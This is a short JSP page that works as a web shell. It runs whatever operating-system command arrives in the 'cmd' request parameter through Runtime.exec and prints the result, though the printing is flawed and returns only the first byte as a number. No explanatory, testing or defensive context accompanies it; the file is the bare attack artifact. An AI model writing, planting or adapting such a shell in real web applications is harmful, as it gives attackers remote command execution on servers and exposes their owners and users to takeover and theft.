<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
out.println(p.getInputStream().read());
%>
